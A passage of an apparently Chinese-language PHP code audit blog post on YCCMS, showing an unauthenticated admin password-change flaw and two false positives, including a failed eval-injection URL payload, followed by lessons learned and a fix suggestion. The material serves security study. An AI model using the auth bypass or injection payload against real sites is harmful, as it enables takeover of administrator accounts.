class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>			<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>			<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>			<span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>				tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>				&#125;<span class="hljs-keyword">else</span>&#123;<br>				tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>			&#125;<br>		&#125;<br>		<br>			<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>			<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到登录到后台页面是有鉴权的，但是执行update方法时就没有鉴权了</p>
+<p>在网站找到功能点：其他功能-&gt;修改密码</p>
+<p>抓取数据包，在数据包中做数据的修改</p>
+<p><img src="/img/yccms/yccms19.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>网站退出登录后可以正常发送数据包</p>
+<p>尝试新用户名和密码后发现可以正常登录</p>
+<h5 id="rce-Action-class-php-误报"><a href="#rce-Action-class-php-误报" class="headerlink" title="rce(Action.class.php)误报"></a>rce(Action.class.php)误报</h5><p>路径：controller&#x2F;Action.class.php</p>
+<p>调用eval函数，可能存在rce漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<br>	<span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<br>	<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查找利用点时发现每一个controller中的文件都继承了此类</p>
+<p>构造payload(<a target="_blank" rel="noopener" href="http://localhost/yccms/admin/?a=admin&m=phpinfo)%E5%8F%91%E7%8E%B0%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE">http://localhost/yccms/admin/?a=admin&amp;m=phpinfo)发现并没有回显</a></p>
+<p>使用动态调试后可以看到m的值初始时为phpinfo</p>
+<p><img src="/img/yccms/yccms09.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>经过run.inc.php方法中代码Factory::setAction()-&gt;run();</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 使用工厂模式调用控制器并执行对应方法</span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure>
+
+<p>m的值被替换为main</p>
+<p>查看setAction方法，此方法中的可控变量是a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br>			<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>				<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<br>		<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此代码大致作用：</p>
+<ol>
+<li>获取请求参数 <code>a</code> 来确定控制器；</li>
+<li>若请求的是后台控制器，且用户未登录，则重定向到登录页面；</li>
+<li>若控制器类文件不存在，则默认使用 <code>LoginAction</code>；</li>
+<li>创建控制器类的对象，并返回</li>
+</ol>
+<p>所以无法调用传入的控制器内不存在的方法</p>
+<p>存在eval函数的方法是run方法，像另一个成功执行的rce漏洞一样构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/yccms/admin/?a=action&amp;m=run();phpinfo();//../#<br></code></pre></td></tr></table></figure>
+
+<p>仍然无法注入成功</p>
+<p>可以看到在步入run.inc.php后，m的值变为main</p>
+<h5 id="文件包含-run-inc-php-误报"><a href="#文件包含-run-inc-php-误报" class="headerlink" title="文件包含(run.inc.php)误报"></a>文件包含(run.inc.php)误报</h5><p>工具审计时发现了require关键字，可能存在文件包含漏洞</p>
+<p>但是require函数内无可控变量，无法利用此函数</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
+<li><p>自动化工具一般是直接搜索关键字或敏感函数，误报很多</p>
+</li>
+<li><p>找漏洞关键要看漏洞点和利用点，有入口能利用才算漏洞</p>
+</li>
+<li><p>寻找敏感函数和可控变量，查看变量有无过滤，过滤是否可绕过</p>
+</li>
+<li><p>cms漏洞：</p>
+<ul>
+<li>鉴权处理不到位，大部分操作都没有鉴权，无需登录就可操作</li>
+</ul>
+<p>​       修复建议：写出单独的鉴权文件，在每个类中引用</p>
+<ul>
+<li>过滤不严格，对文件名及文件路径几乎无过滤</li>
+</ul>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">php代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#php代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>yccms代码审计(php)</div>
+      <div>http://huang-d1.github.io/2025/07/08/yccms代码审计(php)/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>huangdi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 8, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/" title="Java代码审计中的sql注入2.0">
+                        <span class="hidden-mobile">Java代码审计中的sql注入2.0</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
